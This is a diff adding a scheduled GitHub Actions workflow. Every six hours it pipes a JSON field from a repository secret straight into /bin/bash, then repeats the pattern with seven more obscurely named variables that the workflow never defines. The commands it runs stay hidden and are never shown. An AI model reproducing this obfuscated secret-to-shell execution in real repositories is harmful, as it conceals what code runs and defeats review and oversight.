@@ -1,0 +1,25 @@
+name: kahuashouli
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kahuashouli
+        env:
+          dng69: ${{ secrets.dng69 }}
+        run: |
+          echo $dng69 | jq -r .vsx528 | /bin/bash
+          echo $nbitm63 | jq -r .osuh4619 | /bin/bash
+          echo $qqap826 | jq -r .xieu46188 | /bin/bash
+          echo $rt3747 | jq -r .hyg61 | /bin/bash
+          echo $rc406 | jq -r .rb266 | /bin/bash
+          echo $ulj062 | jq -r .l2714 | /bin/bash
+          echo $mj25 | jq -r .b85275 | /bin/bash
+          echo $stlb5557 | jq -r .opaa26300 | /bin/bash
+
